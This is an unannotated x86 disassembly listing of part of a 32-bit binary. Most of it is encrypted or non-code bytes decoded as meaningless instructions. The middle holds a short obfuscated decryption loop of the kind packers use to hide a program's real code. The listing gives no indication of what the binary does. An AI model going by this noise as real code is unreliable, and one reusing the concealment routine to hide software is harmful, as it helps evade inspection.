  4215c7:	lods   eax,DWORD PTR ds:[esi]
  4215c8:	loope  0x42158c
  4215ca:	int    0xe7
  4215cc:	shl    edx,cl
  4215ce:	shr    bl,1
  4215d0:	mov    esi,0xf9f0f5f7
  4215d5:	loope  0x4215b0
  4215d7:	add    ebp,edi
  4215d9:	loop   0x4215b6
  4215db:	add    eax,0xdd02dad8
  4215e0:	fcmovu st,st(5)
  4215e2:	in     al,dx
  4215e3:	rol    cl,cl
  4215e5:	loopne 0x42158f
  4215e7:	(bad)  
  4215e8:	fdiv   st(3),st
  4215ea:	repz ret 0xe5db
  4215ee:	call   0xbf14e1ee
  4215f3:	mov    ebx,0xccc201be
  4215f8:	add    edx,ebx
  4215fa:	aam    0x9
  4215fc:	push   es
  4215fd:	out    dx,eax
  4215fe:	(bad)  
  421600:	retf   
  421601:	fxch   st(4)
  421603:	fadd   st(4),st
  421605:	mov    al,0xe8
  421607:	(bad)
  42160a:	idiv   dl
  42160c:	fcmovnu st,st(2)
  42160e:	in     eax,dx
  42160f:	in     eax,dx
  421610:	mov    bh,0xf4
  421612:	into   
  421613:	repz (bad) 
  421616:	mov    eax,0xf4d901c6
  42161b:	out    0xdb,al
  42161d:	fcmovbe st,st(4)
  42161f:	out    0xea,eax
  421621:	int    0xd8
  421623:	cld    
  421624:	iret   
  421625:	shr    bl,1
  421627:	(bad)
  42162b:	in     eax,dx
  42162c:	mov    dl,0xb4
  42162e:	int3   
  42162f:	std    
  421630:	into   
  421631:	fdiv   st,st(1)
  421633:	leave  
  421634:	cmc    
  421635:	shl    dl,0xd1
  421638:	pop    es
  421639:	mov    esi,0xbeffc6db
  42163e:	inc    esi
  421640:	out    0xfe,al
  421642:	fneni(8087 only) 
  421644:	shl    BYTE PTR [eax-0x301d293a],cl
  42164a:	(bad)  
  42164b:	mov    edx,0xf7f7bad0
  421650:	push   edx
  421652:	cli    
  421653:	leave  
  421654:	fdivp  st(6),st
  421656:	jecxz  0x421652
  421658:	out    0x3,al
  42165a:	fstp   st(0)
  42165c:	icebp  
  42165d:	fld    DWORD PTR [edi]
  42165f:	fadd   DWORD PTR [ecx]
  421661:	add    dl,dh
  421663:	leave  
  421664:	leave  
  421665:	lods   eax,DWORD PTR ds:[esi]
  421666:	jmp    0xb2e4:0xd3c5d5e1
  42166d:	retf   0xd4f9
  421670:	fdivr  QWORD PTR [edi-0x330e2422]
  421676:	cli    
  421677:	aad    0xfb
  421679:	icebp  
  42167a:	(bad)  
  42167b:	jmp    0x421662
  42167d:	in     eax,0xc6
  42167f:	jecxz  0x42168e
  421681:	in     al,dx
  421682:	in     al,0xd
  421684:	mov    cl,0xb1
  421686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421687:	mov    bh,0xf7
  421689:	(bad)  
  42168a:	call   0xd2fc0b77
  42168f:	leave  
  421690:	(bad)  
  421691:	aam    0xf8
  421693:	(bad)  
  421695:	int    0xe7
  421697:	in     eax,dx
  421698:	ret    0xad1
  42169b:	add    eax,0xfafec4c5
  4216a0:	pop    es
  4216a1:	jmp    0xc5d7:0xc2f2e7d9
  4216a8:	(bad)  
  4216aa:	xlat   BYTE PTR ds:[ebx]
  4216ab:	mov    ch,0xce
  4216ad:	out    0xdf,al
  4216af:	dec    ebx
  4216b1:	cld    
  4216b2:	std    
  4216b3:	loope  0x421690
  4216b5:	add    DWORD PTR [ecx],eax
  4216b7:	shl    ecx,cl
  4216b9:	in     eax,0xda
  4216bb:	(bad)  
  4216bd:	(bad)  
  4216be:	jmp    0x421688
  4216c0:	add    DWORD PTR ds:0xeacbc00f,eax
  4216c6:	mov    esi,0xd4acced0
  4216cb:	mov    dh,0xf7
  4216cd:	jmp    0x4216a8
  4216cf:	xlat   BYTE PTR ds:[ebx]
  4216d0:	mov    edi,0xc1baecd2
  4216d5:	sti    
  4216d6:	fiadd  DWORD PTR [edi]
  4216d8:	in     al,0xe6
  4216da:	(bad)  
  4216db:	std    
  4216dc:	aad    0xc9
  4216de:	neg    ah
  4216e0:	int    0xf9
  4216e2:	in     eax,dx
  4216e3:	add    esp,esp
  4216e5:	enter  0xc3e0,0xb1
  4216e9:	sar    edx,1
  4216eb:	out    dx,al
  4216ec:	cmc    
  4216ed:	jmp    0xdfd8:0xf4e9babb
  4216f4:	int3   
  4216f5:	out    dx,eax
  4216f6:	int    0xd0
  4216f8:	loope  0x4216ef
  4216fa:	cli    
  4216fb:	div    dh
  4216fd:	out    dx,eax
  4216fe:	loope  0x4216e8
  421700:	inc    dl
  421702:	add    eax,0xe8efcc05
  421707:	jmp    0xc20efcf6
  42170c:	call   0xd01003e7
  421711:	jecxz  0x4216ce
  421713:	loop   0x4216cd
  421715:	mov    edi,0x4dae2ec
  42171a:	loop   0x4216e3
  42171c:	or     ah,dh
  42171e:	in     al,0xdf
  421720:	hlt    
  421721:	jecxz  0x4216fe
  421723:	fcomp  st(7)
  421725:	loop   0x42171e
  421727:	in     eax,dx
  421728:	mov    bl,0xc4
  42172a:	(bad)  
  42172c:	mov    ah,0xf8
  42172e:	out    dx,eax
  42172f:	idiv   BYTE PTR [ebp-0x31370146]
  421735:	sti    
  421736:	sar    eax,cl
  421738:	out    0xd1,al
  42173a:	mov    ebp,0xb0ac9c0
  42173f:	add    DWORD PTR [edx],eax
  421741:	or     edi,ebx
  421743:	dec    edi
  421745:	in     eax,dx
  421746:	(bad)  
  421747:	shr    ah,1
  421749:	scas   al,BYTE PTR es:[edi]
  42174a:	retf   0xb7d9
  42174d:	stc    
  42174e:	in     eax,dx
  42174f:	repz jmp 0x421751
  421752:	repnz aam 0xd7
  421755:	(bad)  
  421756:	(bad)  
  421757:	xlat   BYTE PTR ds:[ebx]
  421758:	in     eax,0xc2
  42175a:	ffree  st(0)
  42175c:	jmp    0xdf07:0xe6efeefc
  421763:	stc    
  421764:	out    dx,al
  421765:	lock (bad) 
  421767:	mov    cl,0xc7
  421769:	sti    
  42176a:	mov    bh,0xe4
  42176c:	mov    ch,0xd4
  42176e:	xlat   BYTE PTR ds:[ebx]
  42176f:	aam    0xb5
  421771:	in     al,dx
  421772:	in     eax,dx
  421773:	mov    ebp,0xe7b5b8f0
  421778:	loop   0x42177e
  42177a:	add    al,0xf5
  42177c:	in     eax,0xdd
  42177e:	(bad)  
  42177f:	jmp    0xf1f3:0xe80d000e
  421786:	jmp    0x42173a
  421788:	mov    esp,0xc4e9bbb4
  42178d:	retf   
  42178e:	clc    
  42178f:	mov    esi,0xf3f7dec9
  421794:	repnz out dx,al
  421796:	lock out 0xbb,al
  421799:	hlt    
  42179a:	(bad)  
  42179b:	cld    
  42179c:	(bad)  
  42179d:	std    
  42179e:	pop    es
  42179f:	in     eax,dx
  4217a0:	jmp    0xab411e8d
  4217a5:	scas   al,BYTE PTR es:[edi]
  4217a6:	mov    esp,0xe5aaf4e1
  4217ab:	enter  0xe5f7,0xfe
  4217af:	mov    dh,0xd1
  4217b1:	int3   
  4217b2:	in     al,dx
  4217b3:	leave  
  4217b4:	cmc    
  4217b5:	loope  0x4217b4
  4217b7:	(bad)  
  4217b8:	xlat   BYTE PTR ds:[ebx]
  4217b9:	add    bh,bl
  4217bb:	aad    0xd4
  4217bd:	out    0xe7,al
  4217bf:	out    dx,al
  4217c0:	pop    es
  4217c1:	retf   0xf2e1
  4217c4:	mov    eax,0xf2c4e4c3
  4217c9:	retf   
  4217ca:	cmc    
  4217cb:	repnz shl BYTE PTR [eax-0x202e0628],0xdd
  4217d3:	mov    ebp,0xc1d8eec3
  4217d8:	rol    ecx,1
  4217da:	std    
  4217db:	aam    0x6
  4217dd:	cli    
  4217de:	aam    0xce
  4217e0:	out    0xb,al
  4217e2:	repnz add al,0xbf
  4217e5:	rol    edi,1
  4217e7:	icebp  
  4217e8:	icebp  
  4217e9:	shl    BYTE PTR [eax-0x1333311],cl
  4217ef:	jmp    0x4217db
  4217f1:	enter  0xefdd,0xdc
  4217f5:	in     al,dx
  4217f6:	fcmovnbe st,st(4)
  4217f8:	jecxz  0x4217dc
  4217fa:	(bad)  
  4217fc:	cli    
  4217fd:	pop    es
  4217fe:	leave  
  4217ff:	retf   0xc400
  421802:	repz retf 0xa6e2
  421806:	loop   0x4217cd
  421808:	ret    
  421809:	mov    bl,0xc6
  42180b:	loope  0x4217fc
  42180d:	shl    al,0xf5
  421810:	mov    edi,0x3efb9f2
  421815:	add    eax,DWORD PTR [ebx]
  421817:	int    0xd7
  421819:	add    cl,ah
  42181b:	sar    ecx,0xf5
  42181e:	(bad)  
  42181f:	loop   0x421810
  421821:	pinsrw mm5,eax,0xc2
  421825:	repz lds esp,FWORD PTR [ebp+esi*8-0x332d4413]
  42182d:	iret   
  42182e:	(bad)
  421831:	cli    
  421832:	lock cld 
  421834:	shr    ch,cl
  421836:	shl    edi,1
  421838:	shl    bl,1
  42183a:	hlt    
  42183b:	rol    edx,1
  42183d:	loopne 0x421822
  42183f:	add    esi,ebp
  421841:	(bad)  
  421843:	fst    st(0)
  421845:	retf   0xb7ac
  421848:	(bad)  
  421849:	cmc    
  42184a:	repnz ror al,cl
  42184d:	in     eax,0xd1
  42184f:	(bad)  
  421850:	(bad)  
  421851:	test   cl,0xec
  421854:	call   0x602f60f
  421859:	xlat   BYTE PTR ds:[ebx]
  42185a:	dec    DWORD PTR [ecx]
  42185c:	std    
  42185d:	clc    
  42185e:	jecxz  0x421868
  421860:	cmc    
  421861:	(bad)  
  421862:	clc    
  421863:	les    ebp,FWORD PTR [esi-0x1d283138]
  421869:	icebp  
  42186a:	mov    ch,0xb6
  42186c:	lock shr esi,cl
  42186f:	(bad)  
  421870:	sti    
  421871:	ror    edi,1
  421873:	into   
  421874:	loopne 0x421845
  421876:	rcr    esp,0xf0
  421879:	fild   WORD PTR [edx]
  42187b:	fiadd  DWORD PTR [ebx]
  42187d:	fmul   st,st(7)
  42187f:	into   
  421880:	or     eax,0xcee6e2ee
  421885:	shr    DWORD PTR [ebp-0x140c0d1c],0xb3
  42188c:	icebp  
  42188d:	jmp    0x421864
  42188f:	leave  
  421890:	enter  0xdefd,0x2
  421894:	mov    ebp,0xf906cfe3
  421899:	loop   0x421886
  42189b:	std    
  42189c:	loopne 0x421884
  42189e:	cli    
  42189f:	test   dl,0xc2
  4218a2:	or     cl,cl
  4218a4:	test   al,0xc4
  4218a6:	retf   
  4218a7:	retf   0xeed6
  4218aa:	in     al,0xd7
  4218ac:	rcl    dh,cl
  4218ae:	fcmove st,st(7)
  4218b0:	mov    ebx,0xefecf0ba
  4218b5:	aam    0xf2
  4218b7:	shl    esi,1
  4218b9:	mov    esi,0x3c3fee7
  4218be:	jmp    ecx
  4218c0:	(bad)  
  4218c1:	call   0xd935e195
  4218c6:	fnstsw WORD PTR [ebp-0x17531b24]
  4218cc:	rcl    cl,0xe5
  4218cf:	int3   
  4218d0:	into   
  4218d1:	repz add dh,BYTE PTR [eax-0x232c3e44]
  4218d8:	cli    
  4218d9:	aad    0xbc
  4218db:	fsubr  st,st(1)
  4218dd:	(bad)
  4218e0:	enter  0xfdf3,0x6
  4218e4:	fadd   st,st(7)
  4218e6:	mov    esp,0xc1f1edb6
  4218eb:	repz shl DWORD PTR [edi-0x321004a],1
  4218f2:	xlat   BYTE PTR ds:[ebx]
  4218f3:	icebp  
  4218f4:	loopne 0x4218ec
  4218f6:	mov    ebp,0xe1e0ccf9
  4218fb:	loop   0x4218bd
  4218fd:	call   0xf848e7e2
  421902:	retf   
  421903:	retf   
  421904:	jecxz  0x4218d1
  421906:	mov    esp,0xacf7aff7
  42190b:	vpsrlw ymm1,ymm1,xmm7
  42190f:	out    0xef,al
  421911:	mov    ah,0xbf
  421913:	fld    DWORD PTR [eax]
  421915:	mov    eax,0xe6c3ecfd
  42191a:	shl    esi,cl
  42191c:	jmp    0x5fe2427
  421921:	jecxz  0x421926
  421923:	push   cs
  421924:	repz (bad) 
  421926:	xlat   BYTE PTR ds:[ebx]
  421927:	ret    0xf4e4
  42192a:	retf   
  42192b:	rol    cl,1
  42192d:	sar    BYTE PTR [eax-0x2f090745],cl
  421933:	int3   
  421934:	jmp    0xbf45ef05
  421939:	loop   0x42193b
  42193b:	out    0xdc,al
  42193d:	hlt    
  42193e:	add    BYTE PTR ds:0xcfe008fb,al
  421944:	ffree  st(1)
  421946:	(bad)  
  421947:	in     al,0xe6
  421949:	mov    ah,0xd6
  42194b:	stc    
  42194c:	stc    
  42194d:	push   DWORD PTR [edi-0x2a470033]
  421953:	leave  
  421954:	jecxz  0x42194b
  421956:	ret    0xbbe6
  421959:	ffree  st(5)
  42195b:	pop    es
  42195c:	add    BYTE PTR [esi+0x8e1cec7],bh
  421962:	(bad)  [edx]
  421964:	jmp    0xd411df1c
  421969:	shr    DWORD PTR [ecx-0x1820440c],1
  42196f:	(bad)  
  421971:	mov    dh,0xcd
  421973:	icebp  
  421974:	jmp    0x119d369
  421979:	int3   
  42197a:	ret    
  42197b:	loop   0x42197d
  42197d:	shl    al,1
  42197f:	faddp  st(7),st
  421981:	out    dx,eax
  421982:	jmp    0xacec:0xaeb1f2dd
  421989:	rcl    ebp,0xc7
  42198c:	test   edi,0xfeccd6d8
  421992:	mov    ebx,0xbefbf8ca
  421997:	add    edi,ebx
  421999:	mul    esi
  42199b:	repnz mov edi,0xe8d5f702
  4219a1:	in     eax,0xcd
  4219a3:	or     eax,0xe5a8d2e7
  4219a8:	lock mov ch,0xd3
  4219ab:	mov    bl,0xc5
  4219ad:	mov    cl,0xcb
  4219af:	out    dx,al
  4219b0:	aad    0xf5
  4219b2:	test   BYTE PTR [ebx],0xf2
  4219b5:	std    
  4219b6:	out    dx,eax
  4219b7:	aam    0xd1
  4219b9:	std    
  4219ba:	aam    0xdd
  4219bc:	cld    
  4219bd:	call   0xe623219e
  4219c2:	push   cs
  4219c3:	leave  
  4219c4:	leave  
  4219c5:	mov    esi,0xf4f2c8d0
  4219ca:	(bad)  
  4219cb:	jmp    0x4219a5
  4219cd:	mov    ch,0xbb
  4219cf:	repz out dx,al
  4219d1:	hlt    
  4219d2:	ror    bh,cl
  4219d4:	jecxz  0x4219d6
  4219d6:	in     al,dx
  4219d7:	pop    es
  4219d8:	rcr    ebx,cl
  4219da:	fsubr  st(1),st
  4219dc:	ret    0xc6f4
  4219df:	in     eax,0x8
  4219e1:	add    al,0x8
  4219e3:	loopne 0x42198f
  4219e5:	mov    bl,0xb1
  4219e7:	ror    edx,cl
  4219e9:	mul    bh
  4219eb:	div    BYTE PTR [esi-0x44322520]
  4219f1:	fprem1 
  4219f3:	aad    0xf5
  4219f5:	loopne 0x4219ef
  4219f7:	(bad)  
  4219f8:	repz out 0xeb,eax
  4219fb:	(bad)  
  4219fc:	cli    
  4219fd:	(bad)  
  4219fe:	out    0xe2,al
  421a00:	fsub   st,st(7)
  421a02:	(bad)  
  421a03:	icebp  
  421a04:	retf   0xcca8
  421a07:	mov    al,0xad
  421a09:	call   0xd53e13bf
  421a0e:	enter  0xf9da,0xc4
  421a12:	shr    ebp,1
  421a14:	mov    esi,0x207c3b6
  421a19:	mov    esi,0xe2ebbc07
  421a1e:	stc    
  421a1f:	lds    eax,FWORD PTR [ebx]
  421a21:	(bad)  
  421a22:	iret   
  421a23:	stc    
  421a24:	scas   eax,DWORD PTR es:[edi]
  421a25:	mov    cl,0xe4
  421a27:	loopne 0x421a1d
  421a29:	jecxz  0x421a1d
  421a2b:	mov    ah,0xf9
  421a2d:	sar    BYTE PTR [eax-0x449044a],0xde
  421a34:	fsub   st,st(7)
  421a36:	(bad)  
  421a38:	push   es
  421a39:	faddp  st(4),st
  421a3b:	std    
  421a3c:	(bad)  
  421a3e:	out    0xd,eax
  421a40:	in     al,0xff
  421a42:	loope  0x421a40
  421a44:	in     al,dx
  421a45:	jmp    0xf5e1:0xe5c6e1ea
  421a4c:	in     al,dx
  421a4d:	(bad)  
  421a4e:	mov    al,0xd0
  421a50:	imul   cl
  421a52:	icebp  
  421a53:	cmc    
  421a54:	cmc    
  421a55:	std    
  421a56:	loope  0x421a2e
  421a58:	mov    ebx,0xd5b801e0
  421a5d:	retf   
  421a5e:	test   esp,0x13dbfbef
  421a64:	scas   al,BYTE PTR es:[edi]
  421a65:	loope  0x421a35
  421a67:	ret    0xacc3
  421a6a:	mov    cl,0xd0
  421a6c:	call   0xfa2ced41
  421a71:	(bad)  
  421a72:	mov    edi,0xc1ddd9ea
  421a77:	fcomp  st(5)
  421a79:	fld    DWORD PTR [edx]
  421a7b:	(bad)  
  421a7d:	out    dx,eax
  421a7e:	add    edi,ecx
  421a80:	fadd   DWORD PTR ds:0xd2ca0805
  421a86:	icebp  
  421a87:	(bad)
  421a8a:	div    BYTE PTR [edx-0x15054440]
  421a90:	mov    dh,0xd0
  421a92:	xlat   BYTE PTR ds:[ebx]
  421a93:	int3   
  421a94:	mov    esi,0xd3fdf6c1
  421a99:	pop    es
  421a9a:	fisttp QWORD PTR [edx]
  421a9c:	rol    BYTE PTR [edi+edx*8],1
  421a9f:	mov    esp,0x401ccdc
  421aa4:	mov    esp,0xeaf3ccca
  421aa9:	aam    0xad
  421aab:	ret    0xf3f2
  421aae:	sar    edi,1
  421ab0:	repz fdiv st(6),st
  421ab3:	repnz int3 
  421ab5:	iret   
  421ab6:	shl    bl,0xf9
  421ab9:	stc    
  421aba:	aam    0xfa
  421abc:	(bad)  
  421abe:	fadd   st(5),st
  421ac0:	aad    0xa
  421ac2:	repz out 0xeb,al
  421ac5:	out    0xc2,eax
  421ac7:	into   
  421ac8:	out    dx,eax
  421ac9:	shr    bl,cl
  421acb:	repz shl BYTE PTR [edx-0x3714194f],cl
  421ad2:	rcl    edx,1
  421ad4:	into   
  421ad5:	enter  0x5e0,0xf3
  421ad9:	std    
  421ada:	(bad)  
  421adb:	mov    esp,0xe8d7ddca
  421ae0:	(bad)
  421ae3:	les    ebp,FWORD PTR [ebp-0x3d13404f]
  421ae9:	mov    cl,0xf3
  421aeb:	in     eax,0xf4
  421aed:	fidivr DWORD PTR [edx-0xc462d45]
  421af3:	not    esi
  421af5:	(bad)  
  421af7:	lock pop es
  421af9:	sar    bh,1
  421afb:	add    ah,dh
  421afd:	test   DWORD PTR ds:0x5d4fce1,0xccf3ecf8
  421b07:	scas   al,BYTE PTR es:[edi]
  421b08:	in     al,0xd6
  421b0a:	out    dx,eax
  421b0b:	in     al,0xf0
  421b0d:	fcmovbe st,st(5)
  421b0f:	fidivr WORD PTR [ecx+0x1fef7b8]
  421b15:	repz fistp QWORD PTR [esi-0x392c02fe]
  421b1c:	cld    
  421b1d:	fdivrp st(7),st
  421b1f:	out    dx,eax
  421b20:	fcmovne st,st(5)
  421b22:	loop   0x421ae4
  421b24:	in     al,dx
  421b25:	retf   
  421b26:	int    0xc9
  421b28:	jmp    0xd4ef:0xe4acedf2
  421b2f:	int3   
  421b30:	xlat   BYTE PTR ds:[ebx]
  421b31:	int3   
  421b32:	(bad)  
  421b34:	loope  0x421afe
  421b36:	div    dl
  421b38:	loop   0x421b39
  421b3a:	add    DWORD PTR [eax-0x20303b35],edi
  421b40:	jecxz  0x421b07
  421b42:	out    dx,eax
  421b43:	(bad)  
  421b45:	test   edi,0xe7d6d2bd
  421b4b:	int3   
  421b4c:	out    0xb1,al
  421b4e:	xlat   BYTE PTR ds:[ebx]
  421b4f:	mov    edi,0x2dbe8d8
  421b54:	mov    bh,0xcc
  421b56:	push   es
  421b57:	ret    0x2f5
  421b5a:	fmul   QWORD PTR [edx]
  421b5c:	or     edx,ecx
  421b5e:	in     eax,0xf4
  421b60:	cli    
  421b61:	fsubp  st(7),st
  421b63:	bswap  edx
  421b65:	leave  
  421b66:	lods   eax,DWORD PTR ds:[esi]
  421b67:	out    dx,eax
  421b68:	iret   
  421b69:	in     al,dx
  421b6a:	loopne 0x421b34
  421b6c:	repz mov dl,0xed
  421b6f:	aam    0xbd
  421b71:	icebp  
  421b72:	sti    
  421b73:	sar    ah,1
  421b75:	in     eax,dx
  421b76:	(bad)  
  421b77:	std    
  421b78:	push   es
  421b79:	fidivr WORD PTR [ebp+0x101dcc1]
  421b7f:	(bad)  
  421b80:	retf   0x6ff
  421b83:	fdivrp st(1),st
  421b85:	out    0xee,eax
  421b87:	scas   al,BYTE PTR es:[edi]
  421b88:	ret    
  421b89:	xlat   BYTE PTR ds:[ebx]
  421b8a:	mul    dl
  421b8c:	in     al,dx
  421b8d:	test   dh,0xf3
  421b90:	mov    edi,0xe1cdfef5
  421b95:	add    esp,esi
  421b97:	repnz mov esi,0xfdd40bf2
  421b9e:	fadd   QWORD PTR [ebx]
  421ba0:	leave  
  421ba1:	enter  0xae7,0xe8
  421ba5:	ret    0xaec5
  421ba8:	out    0xef,al
  421baa:	jecxz  0x421b7f
  421bac:	scas   eax,DWORD PTR es:[edi]
  421bad:	mov    ebx,0xebc4bbe4
  421bb2:	cld    
  421bb3:	mov    ah,0xc1
  421bb5:	fnstcw WORD PTR [eax-0x3fd030b]
  421bbb:	ret    
  421bbc:	retf   
  421bbd:	aad    0xca
  421bbf:	lds    eax,FWORD PTR [eax]
  421bc1:	pop    es
  421bc2:	les    ecx,FWORD PTR [ebx]
  421bc4:	shr    esp,0xc9
  421bc7:	shr    ah,1
  421bc9:	loope  0x421b56
  421bcb:	test   eax,ecx
  421bcd:	(bad)  
  421bce:	(bad)  
  421bcf:	dec    DWORD PTR [ebx-0x12f7a7c]
  421bd5:	(bad)  
  421bd6:	inc    DWORD PTR ds:0x405fcdc
  421bdc:	mov    ecx,DWORD PTR [ebp-0x138]
  421be2:	mov    DWORD PTR [ebp+ecx*4-0x130],eax
  421be9:	jmp    0x421c0d
  421bee:	mov    eax,DWORD PTR [ebp-0x138]
  421bf4:	mov    eax,DWORD PTR [ebp+eax*4-0x130]
  421bfb:	sub    eax,0x250bcdc
  421c00:	mov    ecx,DWORD PTR [ebp-0x138]
  421c06:	mov    DWORD PTR [ebp+ecx*4-0x130],eax
  421c0d:	jmp    0x41d41c
  421c12:	cmp    DWORD PTR [ebp-0x140],0x0
  421c19:	jne    0x421c39
  421c1f:	movzx  eax,BYTE PTR [ebp-0x131]
  421c26:	xor    eax,0x83
  421c2b:	add    eax,0x8
  421c2e:	mov    BYTE PTR [ebp-0x131],al
  421c34:	jmp    0x421c78
  421c39:	mov    eax,DWORD PTR [ebp-0x110]
  421c3f:	xor    eax,0x75108b5
  421c44:	add    eax,0x3272fb
  421c49:	movzx  ecx,BYTE PTR [ebp-0x131]
  421c50:	sub    ecx,eax
  421c52:	mov    BYTE PTR [ebp-0x131],cl
  421c58:	mov    ecx,DWORD PTR [ebp-0x108]
  421c5e:	xor    ecx,0x75108b5
  421c64:	add    ecx,0x3272fb
  421c6a:	mov    al,BYTE PTR [ebp-0x131]
  421c70:	ror    al,cl
  421c72:	mov    BYTE PTR [ebp-0x131],al
  421c78:	xor    eax,eax
  421c7a:	mov    eax,DWORD PTR [ebp-0x8]
  421c7d:	add    eax,DWORD PTR [ebp-0x10c]
  421c83:	mov    cl,BYTE PTR [ebp-0x131]
  421c89:	mov    BYTE PTR [eax],cl
  421c8b:	mov    eax,DWORD PTR [ebp-0x10c]
  421c91:	sub    eax,0x3272fb
  421c96:	xor    eax,0x75108b5
  421c9b:	cmp    eax,DWORD PTR [ebp-0x118]
  421ca1:	jne    0x421cfe
  421ca7:	mov    eax,DWORD PTR [ebp-0x104]
  421cad:	xor    eax,0x75108b5
  421cb2:	add    eax,0x3272fb
  421cb7:	mov    ecx,DWORD PTR [ebp-0x11c]
  421cbd:	xor    ecx,0x75108b5
  421cc3:	add    ecx,0x3272fb
  421cc9:	sub    eax,ecx
  421ccb:	sub    eax,0x3272fb
  421cd0:	xor    eax,0x75108b5
  421cd5:	mov    DWORD PTR [ebp-0x104],eax
  421cdb:	mov    eax,DWORD PTR [ebp-0x11c]
  421ce1:	xor    eax,0x75108b5
  421ce6:	add    eax,0x3272fb
  421ceb:	mov    ecx,DWORD PTR [ebp-0x13c]
  421cf1:	sub    ecx,eax
  421cf3:	mov    DWORD PTR [ebp-0x10c],ecx
  421cf9:	jmp    0x421d1c
  421cfe:	mov    eax,DWORD PTR [ebp-0x11c]
  421d04:	xor    eax,0x75108b5
  421d09:	add    eax,0x3272fb
  421d0e:	mov    ecx,DWORD PTR [ebp-0x10c]
  421d14:	sub    ecx,eax
  421d16:	mov    DWORD PTR [ebp-0x10c],ecx
  421d1c:	jmp    0x41afe6
  421d21:	mov    eax,DWORD PTR [ebp+0x8]
  421d24:	jmp    0x4240ca
  421d29:	mov    eax,ds:0x66e06a5
  421d2e:	ins    BYTE PTR es:[edi],dx
  421d2f:	icebp  
  421d30:	je     0x421cd7
  421d32:	pop    ebx
  421d33:	sar    BYTE PTR gs:[ebp-0x27],cl
  421d37:	xchg   DWORD PTR [esi+0x7b7a405d],ecx
  421d3d:	add    bl,BYTE PTR [eax-0x53338485]
  421d43:	iret   
  421d44:	imul   bl
  421d46:	ror    edi,cl
  421d48:	rcl    ch,1
  421d4a:	lock aad 0xd3
  421d4d:	mov    esp,0xd6c1d3db
  421d52:	(bad)  
  421d53:	call   0x3edf2f
  421d58:	push   cs
  421d59:	loop   0x421d38
  421d5b:	retf   0xbca8
  421d5e:	lods   al,BYTE PTR ds:[esi]
  421d5f:	xlat   BYTE PTR ds:[ebx]
  421d60:	int3   
  421d61:	lods   eax,DWORD PTR ds:[esi]
  421d62:	iret   
  421d63:	lock (bad) 
  421d65:	not    ah
  421d67:	dec    ebp
  421d69:	aad    0xcf
  421d6b:	(bad)  
  421d6d:	fcmovbe st,st(6)
  421d6f:	aad    0xfd
  421d71:	(bad)  
  421d72:	shr    dl,1
  421d74:	(bad)  
  421d76:	fsub   st,st(1)
  421d78:	paddsw mm7,mm6
  421d7b:	repz loop 0x421d44
  421d7e:	shl    BYTE PTR [ecx-0x26162c30],0xb6
  421d85:	in     al,0xf4
  421d87:	(bad)  
  421d88:	sar    BYTE PTR [esi-0x232e4228],cl
  421d8e:	loopne 0x421d82
  421d90:	test   DWORD PTR [ecx],0xe2dad902
  421d96:	loop   0x421da5
  421d98:	jmp    0x421d7a
  421d9a:	in     eax,dx
  421d9b:	shl    bl,cl
  421d9d:	jecxz  0x421d6d
  421d9f:	hlt    
  421da0:	ret    0xcfce
  421da3:	sti    
  421da4:	fdiv   DWORD PTR [edi-0x4a401042]
  421daa:	aam    0xc3
  421dac:	pop    es
  421dad:	icebp  
  421dae:	push   es
  421daf:	mov    ebp,0xc0d2f8f3
  421db4:	cld    
  421db5:	iret   
  421db6:	clc    
  421db7:	fprem  
  421db9:	repnz or ebp,eax
  421dbc:	in     al,0xdc
  421dbe:	in     eax,dx
  421dbf:	(bad)  
  421dc0:	scas   al,BYTE PTR es:[edi]
  421dc1:	jmp    0xb4b8:0xfae9b7e9
  421dc8:	into   
  421dc9:	fdivp  st(3),st
  421dcb:	xlat   BYTE PTR ds:[ebx]
  421dcc:	in     al,dx
  421dcd:	fsub   st(4),st
  421dcf:	add    al,0xf1
  421dd1:	in     al,0xf2
  421dd3:	ret    
  421dd4:	stc    
  421dd5:	jecxz  0x421dd5
  421dd7:	in     al,0xdb
  421dd9:	inc    BYTE PTR [esi]
  421ddb:	loope  0x421dcf
  421ddd:	enter  0xeec7,0xf5
  421de1:	ret    0xe0ca
  421de4:	out    dx,al
  421de5:	stc    
  421de6:	jmp    0xd7e0:0xd9fef4f3
  421ded:	(bad)  
  421def:	(bad)  
  421df1:	(bad)  
  421df2:	repnz hlt 
  421df4:	add    eax,DWORD PTR [edx]
  421df6:	(bad)  
  421df7:	out    dx,al
  421df8:	clc    
  421df9:	cld    
  421dfa:	(bad)  
  421dfc:	retf   0xcaf7
  421dff:	mov    ch,0xb7
  421e01:	in     al,dx
  421e02:	out    dx,al
  421e03:	out    dx,al
  421e04:	(bad)
  421e07:	sti    
  421e08:	out    dx,eax
  421e09:	cli    
  421e0a:	out    dx,eax
  421e0b:	aam    0xe2
  421e0d:	icebp  
  421e0e:	repnz push es
  421e10:	add    ebx,ebp
  421e12:	(bad)  
  421e13:	jmp    0x2102312
  421e18:	or     eax,0xaeaee2fb
  421e1d:	ffreep st(6)
  421e1f:	les    ebp,FWORD PTR [edx-0x5151a0e]
  421e25:	jmp    0xfc460ed6
  421e2a:	idiv   esp
  421e2c:	enter  0xfcf8,0x7
  421e30:	in     al,0x7
  421e32:	ror    DWORD PTR [eax],0xd4
  421e35:	cmc    
  421e36:	enter  0xc5c8,0xde
  421e3a:	shl    edi,cl
  421e3c:	(bad)  
  421e3e:	lods   al,BYTE PTR ds:[esi]
  421e3f:	ror    bh,1
  421e41:	out    0xb7,al
  421e43:	mov    cl,0xb0
  421e45:	aad    0xe6
  421e47:	div    DWORD PTR [ebp+0x2feb9e9]
  421e4d:	fnsave [eax+ebx*8+0xbffc7bc]
  421e54:	loop   0x421e32
  421e56:	aad    0xc6
  421e58:	or     ecx,eax
  421e5a:	adc    esp,ebp
  421e5c:	mov    esp,0xdbaef3e9
  421e61:	lods   eax,DWORD PTR ds:[esi]
  421e62:	in     eax,dx
  421e63:	call   0xff0e1e4f
  421e68:	int    0xd4
  421e6a:	retf   0xf800
  421e6d:	lock int 0x3
  421e70:	stc    
  421e71:	loop   0x421e4f
  421e73:	loopne 0x421e6d
  421e75:	add    ecx,DWORD PTR [eax]
  421e77:	fadd   DWORD PTR [esp+ecx*1]
  421e7a:	retf   
  421e7b:	repz xlat BYTE PTR ds:[ebx]
  421e7d:	mov    dl,0xf7
  421e7f:	lock ror al,cl
  421e82:	mov    edx,0xb8dbe0e4
  421e87:	in     eax,0xb5
  421e89:	hlt    
  421e8a:	mov    edx,0xd0d4d6f2
  421e8f:	shl    bl,1
  421e91:	jecxz  0x421e96
  421e93:	mov    BYTE PTR [edx],0xc7
